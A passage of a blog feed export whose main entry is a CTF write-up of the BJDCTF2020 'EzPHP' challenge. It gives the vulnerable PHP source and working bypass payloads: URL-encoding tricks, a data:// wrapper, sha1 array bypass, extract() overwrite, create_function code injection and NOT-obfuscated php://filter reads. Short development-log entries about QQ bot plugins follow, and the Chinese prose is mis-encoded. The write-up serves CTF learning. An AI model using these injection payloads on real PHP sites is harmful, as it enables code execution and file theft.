class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è§£æ"><a href="#è§£æ" class="headerlink" title="è§£æ"></a>è§£æ</h3><p>å¾ˆå¤šæ­£åˆ™åŒ¹é…ï¼Œå¾—è€å¿ƒçš„ä¸€ä¸ªä¸€ä¸ªæ¥ã€‚</p><h4 id="SERVER-39-QUERY-STRING-39-ç»•è¿‡"><a href="#SERVER-39-QUERY-STRING-39-ç»•è¿‡" class="headerlink" title="$_SERVER[&#39;QUERY_STRING&#39;]ç»•è¿‡"></a><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>ç»•è¿‡</h4><p>è¿™ç©æ„ä¸ä¼šurlè§£ç ï¼Œæ‰€ä»¥å¯ä»¥ç”¨urlç¼–ç ç»•è¿‡ï¼Œéœ€è¦å°†æ‰€æœ‰å­—ç¬¦éƒ½urlç¼–ç ä¸€ä¸‹</p><p>ä¾‹å¦‚<code>d</code>-&gt;<code>%64</code>ï¼Œ64æ˜¯<code>d</code>çš„asciiç çš„16è¿›åˆ¶</p><p>è¿™ä¸ä»…æ£€æµ‹value,keyä¹Ÿä¼šæ£€æµ‹ï¼Œæ‰€ä»¥é™¤äº†<code>=</code>ä¸<code>&amp;</code>,å…¶ä»–éƒ½å¯ä»¥è€ƒè™‘ç¼–ç ä¸€ä¸‹</p><h4 id="å¼€å¤´ç»“å°¾æ­£åˆ™åŒ¹é…ç»•è¿‡"><a href="#å¼€å¤´ç»“å°¾æ­£åˆ™åŒ¹é…ç»•è¿‡" class="headerlink" title="å¼€å¤´ç»“å°¾æ­£åˆ™åŒ¹é…ç»•è¿‡"></a>å¼€å¤´ç»“å°¾æ­£åˆ™åŒ¹é…ç»•è¿‡</h4><p><code>&#39;/^aqua_is_cute$/&#39;</code>åŒ¹é…å¼€å¤´ç»“å°¾ï¼Œç”¨<code>%0a</code>ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">debu&#x3D;aqua_is_cute%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="REQUEST-æ­£åˆ™ç»•è¿‡"><a href="#REQUEST-æ­£åˆ™ç»•è¿‡" class="headerlink" title="$_REQUEST æ­£åˆ™ç»•è¿‡"></a><code>$_REQUEST</code> æ­£åˆ™ç»•è¿‡</h4><p>å…ˆGETåPOSTï¼Œå¯ä»¥POSTçš„ä¸€ä¸ªæ–°å€¼ç»•è¿‡</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801191441715-16278164826491.png" alt="image-20210801191441715"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801191457689.png" alt="image-20210801191457689"></p><p>å¯è§açš„å€¼åœ¨æ£€æµ‹çš„æ—¶å€™è¢«è¦†ç›–äº†ã€‚ä½†å®é™…ä¸Šæ²¡æœ‰å˜ã€‚æ‰€ä»¥åªéœ€è¦åœ¨POSTé‡Œæ”¾å‡ ä¸ªæ­£å¸¸å‚æ•°å³å¯ç»•è¿‡ã€‚</p><p>è€Œåé¢è¿˜æœ‰shana[]ã€passwd[]ã€flag[code]ã€flag[arg]ï¼Œè¿™äº›æ˜¯æ•°ç»„ï¼Œä¸ä¼šè¢«æ­£åˆ™åŒ¹é…åˆ°ï¼Œæ‰€ä»¥ä¸éœ€è¦åŠ posté‡Œ</p><h4 id="file-get-contents-file-39-debu-debu-aqua-39"><a href="#file-get-contents-file-39-debu-debu-aqua-39" class="headerlink" title="file_get_contents($file) !== &#39;debu_debu_aqua&#39;"></a><code>file_get_contents($file) !== &#39;debu_debu_aqua&#39;</code></h4><p>å°±ç”¨dataä¼ªåè®®ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="sha1-ç»•è¿‡"><a href="#sha1-ç»•è¿‡" class="headerlink" title="sha1()ç»•è¿‡"></a><code>sha1()</code>ç»•è¿‡</h4><p>ç±»ä¼¼<code>md5()</code>ç”¨æ•°ç»„ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">shana[]&#x3D;1&amp;passwd[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>extract($_GET[&quot;flag&quot;]);</code>ï¼Œæ¥è¿›è¡Œå˜é‡è¦†ç›–ï¼Œç»™ä¸‹é¢çš„$flagå’Œ$argèµ‹å€¼ç”¨ã€‚</p><p>flag[code]=xxx,flag[arg]=xxx,</p><h4 id="create-functionä»£ç æ³¨å…¥"><a href="#create-functionä»£ç æ³¨å…¥" class="headerlink" title="create_functionä»£ç æ³¨å…¥"></a>create_functionä»£ç æ³¨å…¥</h4><p>php&lt;7.2</p><p>6.<code>create_function</code>ä¼šåˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼ˆ<code>lambda</code>æ ·å¼),ç„¶ååœ¨å†…éƒ¨å¯¹ç¬¬äºŒä¸ªå‚æ•°æ‰§è¡Œ<code>eval()</code></p><p>é‚£å¦‚ä½•è¿›è¡Œä»£ç æ³¨å…¥äº†ï¼Ÿå› ä¸ºä»–è¿™ä¸ªæ˜¯ç”¨<strong>å­—ç¬¦ä¸²æ‹¼æ¥</strong>æˆä»£ç ï¼Œå°±ç±»ä¼¼äºsqlæ³¨å…¥ï¼š</p><p>æå‰é—­åˆ+æ¶æ„ä»£ç +æ³¨é‡Šåé¢</p><p>æ —å­1ï¼š</p><blockquote><p>æ³¨æ„ï¼šç¬¬äºŒä¸ªå‚æ•°å†…çš„<strong>å˜é‡</strong>å¦‚æœæ²¡æœ‰åœ¨å¤–éƒ¨å£°æ˜ï¼Œåˆ™éœ€è¦å•å¼•å·ï¼›å¦‚æœåœ¨å¤–éƒ¨å£°æ˜äº†ï¼Œå°±ç”¨åŒå¼•å·ã€‚</p></blockquote><p><code>$a</code>ä¸<code>$b</code>æ²¡æœ‰å£°æ˜å˜é‡ï¼Œæ‰€ä»¥ç”¨å•å¼•å·ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$a, $b'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'return($a+$b);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//func()ç­‰ä»·äº</span><span class="token keyword">function</span> <span class="token function-definition function">func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€ :</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ —å­2ï¼š</p><p><code>$c</code>åœ¨å¤–å£°æ˜å˜é‡äº†ï¼Œå¯ä»¥ç”¨åŒå¼•å·ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$lambda</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$c</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$lambda</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç­‰ä»·äº</span><span class="token keyword">function</span> <span class="token function-definition function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>äºæ˜¯æˆ‘æ„é€ </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>      <span class="token operator">?</span>c<span class="token operator">=</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥çœ‹é¢˜ï¼Œ<code>$code(&#39;&#39;, $arg);</code>å¾ˆç›¸ä¼¼</p><p>æ‰€ä»¥<code>$code(&#39;&#39;, $arg); </code>ï¼Œè®©<code>$code</code>=<code>create_function</code>ï¼Œå°±å˜æˆ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">lambda</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$arg</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>é‚£åªéœ€è¦arg=}func();//</p><p>å…ˆæ•´ç†ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">ç¬¬ä¸€ä¸ªï¼š?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61ç¬¬äºŒä¸ªdebu&#x3D;aqua_is_cute%0a%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0aç¬¬ä¸‰ä¸ªï¼šshana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2ç¬¬å››ä¸ªï¼šflag[code]&#x3D;create_function%66%6c%61%67[%63%6f%64%65]&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è·å–flag"><a href="#è·å–flag" class="headerlink" title="è·å–flag"></a>è·å–flag</h4><p>å…³äºç¬¬äº”ä¸ªï¼Œæ¶æ„ä»£ç çš„æ³¨å…¥ï¼Œæœ‰å¾ˆå¤šç§æ–¹å¼ã€‚</p><p>å› ä¸º<code>include &quot;flag.php&quot;;</code>,æ‰€ä»¥å¯ä»¥åˆ©ç”¨<code>get_defined_vars()</code>è¯»å–æ‰€æœ‰å˜é‡ï¼Œ</p><pre class="line-numbers language-none"><code class="language-none">ç¬¬äº”ä¸ªï¼šflag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;%66%6c%61%67[%61%72%67]&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801225458425.png" alt="image-20210801225458425"></p><p>ç„¶åéœ€è¦è¯»å–<code>rea1fl4g.php</code></p><p>1.è¿‡æ»¤äº†includeå’Œå¼•å·ï¼Œè¿˜å¯ä»¥ç”¨require()</p><pre class="line-numbers language-none"><code class="language-none">&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801231507321.png" alt="image-20210801231507321"></p><p>buuctfä¸Šæ”¹äº†æ”¹ï¼ŒæŠŠflagç»™unsetäº†ï¼Œæ‰€ä»¥å¾—æ¢ç§åŠæ³•</p><p>2.ä¼ªåè®®</p><pre class="line-numbers language-none"><code class="language-none">&amp;rce&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.php&amp;flag[arg]&#x3D;;&#125;require(get_defined_vars()[_GET][rce]);&#x2F;&#x2F;&#x2F;&#x2F;POSTè®°å¾—åŠ ä¸ªrce&#x3D;2&#x2F;&#x2F;è¯»å–get_defined_vars()é‡Œçš„[&#39;_GET&#39;][rce]ï¼Œç„¶åincludeå‡ºæ¥ã€‚&#x2F;&#x2F;å¦‚æœåªæ˜¯require(php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.php)æ˜¯ä¸è¡Œçš„ã€‚ä¸­é—´çš„ä¼ªåè®®ä¸²éœ€è¦å–å&#x2F;å¼‚æˆ–æ¥ç»•è¿‡æœ€åä¸€ä¸ªæ­£åˆ™<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&amp;%66%6c%61%67[%61%72%67]&#x3D;%3b%7d%72%65%71%75%69%72%65%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%5b%5f%47%45%54%5d%5b%72%63%65%5d%29%3b%2f%2f&amp;rce&#x3D;%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%72%65%61%64%3d%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%65%6e%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%72%65%61%31%66%6c%34%67%2e%70%68%70<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3.å–å+ä¼ªåè®®</p><p>å–åå¯ç›´æ¥ç»•è¿‡æ­£åˆ™</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.phpå–åä¸€ä¸‹;&#125;require(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¼‚æˆ–ä¸è¡Œï¼Œç¦äº†^</p><p>4.<code>define</code>å®šä¹‰å˜é‡ï¼Œfopenã€fgetsè¯»å–å†…å®¹</p><pre class="line-numbers language-none"><code class="language-none">;&#125;define(aaa,fopen(~(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f),r));while(!feof(aaa))var_dump(fgets(aaa));fclose(aaa);&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å¥‡æ–‡å…±èµ"><a href="#å¥‡æ–‡å…±èµ" class="headerlink" title="å¥‡æ–‡å…±èµ"></a>å¥‡æ–‡å…±èµ</h2><p><a href="https://www.gem-love.com/ctf/770.html">2020BJDCTF â€œEzPHPâ€ +Y1ngCTF â€œY1ngâ€™s Baby Codeâ€ å®˜æ–¹writeup</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
            <tag> æ­£åˆ™ç»•è¿‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQæœºå™¨äººæ’ä»¶:å¤©å‘½ä¹‹å­wiki</title>
      <link href="/p/2830835001.html"/>
      <url>/p/2830835001.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¾¤å‹æƒ³è¦ä¸ªè¿™æ ·çš„æœºå™¨äººï¼Œæˆ‘æƒ³ç€æŒºç®€å•çš„ï¼Œäºæ˜¯å°±å†™äº†ã€‚</p><p>äººæœºäº¤äº’ä¸Šä¸éš¾ï¼Œé‡ç‚¹è¿˜æ˜¯wikiæ•°æ®åº“ã€‚</p><p>è¿™æ¬¡æ•°æ®åº“æ˜¯ç”¨äº†ORMï¼Œç¬¬ä¸€æ¬¡ç”¨ï¼Œæœ‰ä¸å°‘éº»çƒ¦ï¼Œæ€è·¯é€šäº†å°±å¥½å¤šäº†ã€‚</p><h2 id="é¢„è§ˆ"><a href="#é¢„è§ˆ" class="headerlink" title="é¢„è§ˆ"></a>é¢„è§ˆ</h2><p><img src="/../images/QQ%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%8F%92%E4%BB%B6-%E5%A4%A9%E5%91%BD%E4%B9%8B%E5%AD%90wiki/image-20210731210529301.png" alt="image-20210731210529301"></p><h2 id="å¼€å‘æ—¥å¿—"><a href="#å¼€å‘æ—¥å¿—" class="headerlink" title="å¼€å‘æ—¥å¿—"></a>å¼€å‘æ—¥å¿—</h2><h3 id="2021å¹´7æœˆ31æ—¥21-01-53"><a href="#2021å¹´7æœˆ31æ—¥21-01-53" class="headerlink" title="2021å¹´7æœˆ31æ—¥21:01:53"></a>2021å¹´7æœˆ31æ—¥21:01:53</h3><p>é¬¼çŸ¥é“è¿™modlesèƒ½æŠ˜è…¾æˆ‘é‚£ä¹ˆä¹…å•Šï¼ï¼ï¼ï¼æ•´æ•´æµªè´¹äº†æˆ‘ä¸€å¤©æ—¶é—´ï¼Œç—›è‹¦é¢å…·.jpg</p><p>åœ¨æ­¤å¾ˆæ„Ÿè°¢harukabotçš„ä½œè€…skï¼Œè€å¿ƒæŒ‡ç‚¹äº†å¾ˆä¹…ï¼Œç»™äº†æå¤§çš„å¸®åŠ©ï¼ŒèŠ‚çœäº†å¾ˆå¤šçš„æ—¶é—´ã€‚è¦ä¸æ˜¯å¥¹æˆ‘ä¸çŸ¥é“è¦æŠ˜ç£¨åˆ°ä»€ä¹ˆæ—¶å€™ã€‚</p><p>è¿˜å¥½ï¼Œæ€è·¯é€šäº†ï¼Œå°±èˆ’æœå¤šäº†ã€‚å­å“§å­å“§åˆæ­¥æ¡†æ¶å°±å†™å¥½äº†ï¼Œæ¥ä¸‹æ¥å®Œå–„ä¸‹äº¤äº’é€»è¾‘å°±OKã€‚</p><h3 id="2021å¹´7æœˆ30æ—¥18-16-40"><a href="#2021å¹´7æœˆ30æ—¥18-16-40" class="headerlink" title="2021å¹´7æœˆ30æ—¥18:16:40"></a>2021å¹´7æœˆ30æ—¥18:16:40</h3><p>å½“æˆ‘æ‹å‡ºå­—ç¬¦ä¸²æ‹¼æ¥çš„sqlè¯­å¥æ—¶ï¼Œç¾¤å‹ï¼šâ€œä½ å¥½ï¼Œæˆ‘å«starbucks;drop databases _â€ã€‚å“å¾—æˆ‘å½“åœºæµªå­å›å¤´å¼€å§‹ç™¾åº¦ORMç›¸å…³ã€‚</p><p>çº ç»“äº†å¾ˆä¹…ï¼Œä¸çŸ¥é“ç”¨å“ªä¸ªæ¡†æ¶ï¼Œä¸€ç•ªæ¯”è¾ƒä¹‹ä¸‹ï¼Œç”¨äº†æ”¯æŒå¼‚æ­¥çš„tortoiseã€‚</p><p>äºæ˜¯ï¼Œå™©æ¢¦å¼€å§‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> QQæœºå™¨äººæ’ä»¶ </tag>
            
            <tag> Nonebot2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQæœºå™¨äººæ’ä»¶:æ‰«æBUGKUå…¬å¼€AWDæˆ¿é—´</title>
      <link href="/p/60536736.html"/>
      <url>/p/60536736.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>QQæœºå™¨äººå¼€å‘æ˜¯æˆ‘ä¸€ç›´ä»¥æ¥çš„æ¢¦æƒ³å•Šï¼Œå½“åˆåˆšæ‰“ç®—å†™çš„æ—¶å€™ï¼Œå¾—ï¼Œè…¾è®¯å…¨é¢å°æ€QQæœºå™¨äººã€‚äºæ˜¯æœäº†æœï¼Œmiraiè¿˜æ´»ç€ï¼Œä¸€çœ‹æ–‡æ¡£ï¼Œâ€œéœ€è¦Kotlinâ€çŸ¥è¯†ï¼Œä¸€ä¸‹æŠŠæˆ‘æ‰“é€€äº†ã€‚</p><p>äºæ˜¯å°±è¿™æ ·æç½®äº†ä¸€å¹´ï¼Œå†æœï¼Œnonebot2ï¼Œpythonå¼€å‘ã€‚ä¸Šæ‰‹è¯•äº†ä¸¤å¤©ï¼ŒæˆåŠŸå†™äº†ä¸ªæ’ä»¶demoï¼ŒçœŸç—›å¿«å•Šã€‚</p><p>æœŸé—´è¿˜é‡æ–°è¡¥ä¹ äº†ä¸‹å¼‚æ­¥çŸ¥è¯†ä¸ç±»å‹æ³¨è§£ã€‚å­¦åˆ°äº†å¾ˆå¤šã€‚</p><p>æŠ˜è…¾äº†å¾ˆå¤šå¤©ï¼Œç¬¬ä¸€ä¸ªQQæœºå™¨äººæ’ä»¶å·®ä¸å¤šä¹Ÿå®Œå·¥äº†ï¼Œèµ·ä¸ªæ–‡å½“å¼€å‘è®°å½•ã€‚</p><h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><p><a href="https://github.com/KagamigawaMeguri/nonebot_plugin_bugku">https://github.com/KagamigawaMeguri/nonebot_plugin_bugku</a></p><h2 id="å¼€å‘æ—¥å¿—"><a href="#å¼€å‘æ—¥å¿—" class="headerlink" title="å¼€å‘æ—¥å¿—"></a>å¼€å‘æ—¥å¿—</h2><h3 id="2021å¹´7æœˆ31æ—¥20-58-54"><a href="#2021å¹´7æœˆ31æ—¥20-58-54" class="headerlink" title="2021å¹´7æœˆ31æ—¥20:58:54"></a>2021å¹´7æœˆ31æ—¥20:58:54</h3><p>QQé£æ§çœŸä¸¥ï¼Œæ•´äº†ä¸ªå°å·è¿å›¾ç‰‡éƒ½å‘ä¸äº†ï¼ŒæŒºçƒ¦çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> QQæœºå™¨äººæ’ä»¶ </tag>
            
            <tag> Nonebot2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ping+å¤šçº¿ç¨‹/åç¨‹çš„Pythonè„šæœ¬</title>
      <link href="/p/1603334844.html"/>
      <url>/p/1603334844.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰äº›æ—¥å­å¼€å§‹ä½¿ç”¨bugkuçš„awdå¹³å°è¿›è¡Œç»ƒä¹ ï¼Œé¶æœºipè¿˜å¾—è‡ªå·±æ‰«ï¼Œäºæ˜¯ä¸ºäº†æ–¹ä¾¿å°±å†™äº†ä¸ªç®€å•çš„ping+æ–‡ä»¶å†™å…¥è„šæœ¬ï¼Œç”¨äºæ‰«å¥½ipæ”¾å…¥ç‰¹å®štxtä¾¿äºåç»­è„šæœ¬è¯»å–ã€‚</p><p>å‰å‡ å¤©æƒ³ç€æœ‰ç‚¹æ…¢ï¼Œäºæ˜¯åŠ äº†ä¸ªå¤šçº¿ç¨‹ã€‚</p><p>æœ€è¿‘åˆæ­£å¥½å­¦äº†å¼‚æ­¥ï¼ŒæŠ±ç€å¤§è¿‡å¹´çš„æ¥éƒ½æ¥äº†è¿˜åªæ˜¯ä¸ªå­©å­å¿ƒæ€å°±å°è¯•ç”¨å¼‚æ­¥æ¥pingã€‚</p><p>æ²¡æƒ³åˆ°ä¸€å†™ï¼Œæ‰å‘ç°ä¹‹å‰å†™çš„Asyncioç¬”è®°æœ‰å¾ˆå¤šé”™è¯¯ï¼Œæœç„¶è¿˜æ˜¯å¾—å®è·µå‡ºçœŸçŸ¥ã€‚</p><p>è´´ä¸ªç¬”è®°é“¾æ¥ï¼š<a href="https://syunaht.com/p/574792763.html">å¼‚æ­¥Asyncioå­¦ä¹ ç¬”è®°</a></p><h2 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><p><code>ping3.ping</code>çš„<code>timeout</code>å‚æ•°ç±»å‹è¯´æ˜æ˜¯<code>int</code>ï¼Œä½†æˆ‘æ¢æˆå°æ•°ä¹Ÿæ²¡é—®é¢˜ã€‚</p><p>å¤ªå°å®¹æ˜“è¯¯åˆ¤ï¼Œå¤ªå¤§åˆè¿‡æ…¢ï¼Œæƒ³è¦æœ€ä½³åŒ–ï¼Œè¿˜æ˜¯å¾—æŠŠæ¡å¥½<code>timeout</code>æ—¶é—´ã€‚</p><h3 id="å¤šçº¿ç¨‹"><a href="#å¤šçº¿ç¨‹" class="headerlink" title="å¤šçº¿ç¨‹"></a>å¤šçº¿ç¨‹</h3><pre class="line-numbers language-python" 